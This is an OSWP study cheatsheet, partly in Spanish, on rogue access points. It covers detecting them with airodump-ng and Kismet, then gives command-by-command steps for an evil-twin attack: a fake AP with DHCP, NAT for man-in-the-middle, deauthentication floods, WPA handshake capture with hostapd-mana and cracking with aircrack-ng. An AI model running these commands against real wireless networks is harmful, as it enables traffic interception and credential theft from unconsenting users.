# Rogue Access Points (Rogue AP) - OSWP Cheatsheet with Commands and Steps

* What is a Rogue AP?

Unauthorized AP inside a target environment.
Used for unauthorized access, MITM, credential capture.

Tools Used

- Airmon-ng / Airodump-ng / Airbase-ng (aircrack-ng suite)
- Kismet
- Wireshark
- Hostapd
- MDK4

#### Step 1: Enable Monitor Mode

Before scanning or creating rogue APs, put your wireless interface into monitor mode.

```bash
sudo airmon-ng start wlan0
```
> This creates wlan0mon (monitor mode interface)

#### Step 2: Scan for APs (Detecting Rogue APs)

Use airodump-ng or kismet to list all APs in range:
```bash
sudo airodump-ng wlan0mon
```
Look for unknown SSIDs or BSSIDs
Note ESSID, BSSID (MAC), CH (channel), encryption type

Alternatively, start kismet (has GUI/CLI interface):

```bash
sudo kismet
```
#### Step 3: Analyze Suspected Rogue APs

Check if an AP’s BSSID matches known authorized APs.
Rogue APs might have the same ESSID but different MAC.
Check signal strengths and locations.
Use Wireshark to capture and analyze suspicious traffic:

```bash
sudo wireshark &
```
Capture on wlan0mon and filter by AP MAC or SSID.

#### Step 4: Create a Rogue AP (Evil Twin) for Testing

Use airbase-ng to create a fake AP simulating a legitimate one:

```bash
sudo airbase-ng -e "Target_SSID" -c 6 wlan0mon
```
- -e specifies the SSID.
- -c specifies the channel to use.

This creates a fake AP broadcasting "Target_SSID" on channel 6.
#### Step 5: Handle DHCP for Rogue AP

To provide IP addresses to clients connecting to your rogue AP, set up a DHCP server:

Example using dnsmasq:
```bash
sudo systemctl stop NetworkManager
```
```bash
sudo ip addr add 192.168.10.1/24 dev at0  # 'at0' is virtual interface created by airbase-ng
```
```bash
sudo dnsmasq --interface=at0 --dhcp-range=192.168.10.10,192.168.10.50,12h
```
Ensure DHCP range does not conflict with the real network.

#### Step 6: Forward Traffic and Enable MITM (Optional)

To forward traffic and enable man-in-the-middle attacks:
```bash
sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -j ACCEPT
```
Replace wlan0 with your Internet-facing interface.
#### Step 7: Deauthenticate Clients from Legit AP (Force them to connect to Rogue AP)

Use mdk4 or aireplay-ng to send deauth packets:
```bash
sudo mdk4 wlan0mon d -c 6 -b <AP BSSID>
```
or with aireplay-ng:
```bash
sudo aireplay-ng --deauth 10 -a <AP BSSID> wlan0mon
```
Causes clients to disconnect from real AP and possibly connect to your rogue AP.

#### Step 8: Analyze Captured Data

Use Wireshark to analyze traffic, capture credentials, or data exfiltration.
Look for unencrypted data or weak authentication.

#### Summary of Key Commands:
|Purpose |Command Example|
|--------|-----------------|
|Enable monitor mode |`sudo airmon-ng start wlan0` |
|Scan APs |	`sudo airodump-ng wlan0mon`|
|Start kismet for detection 	|`sudo kismet`|
|Create fake AP (Rogue AP) |`sudo airbase-ng -e "SSID" -c 6 wlan0mon` |
|Setup DHCP server on at0 	|`sudo ip addr add 192.168.10.1/24 dev at0` + `sudo dnsmasq --interface=at0 --dhcp-range=192.168.10.10,192.168.10.50,12h`
|Enable IP forwarding |	`sudo sysctl -w net.ipv4.ip_forward=1`|
|Setup NAT for routing 	|`sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE`|
|Send deauth packets 	|`sudo mdk4 wlan0mon d -c 6 -b <AP BSSID>` or `sudo aireplay-ng --deauth 10 -a <AP BSSID> wlan0mon`

-------

## Flow attack

**Apuntes Comandos:**
> Necesitamos dos tarjetas de red con capacidades de inyeccion y monitor mode.


### Discovery
>Con wlan0mon
```bash
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```
```bash
wireshark discovery-01.cap
```
En base a lo que veamos en wireshark debemos aramar el archivo de configuracion.

### Creacion
#### A. Crear archivo configuracion
```bash
cat <essid>-mana.conf
interface=wlan0
ssid=<essid>
channel=1
hw_mode=g # banda a 2,4 GHz
ieee80211n=1 # 802.11n
wpa=3 # WPA/WPA2
wpa_key_mgmt=WPA-PSK # autenticación PSK
wpa_passphrase=ANYPASSWORD # configurar la clave
wpa_pairwise=TKIP CCMP # habilitar el cifrado TKIP/CCMP con WPA1
rsn_pairwise=TKIP CCMP # habilitar TKIP/CCMP con cifrado WPA2
mana_wpaout=/home/kali/<essid>.hccapx # output de protocolos de enlace capturados
```

#### B. Captura protocolos de enlace (handshake)
```bash
sudo hostapd-mana <essid>-mana.conf 
```
>**Con wlan1mon**

#### C. Deautenticamos clientes con la otra tarjeta de red en modo monitor

```bash
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan1mon
```

**C.1 Crackeamos protocolo de enlace (handshake)**

```bash
aircrack-ng <essid>.hccapx -e <essid> -w /usr/share/john/password.lst
```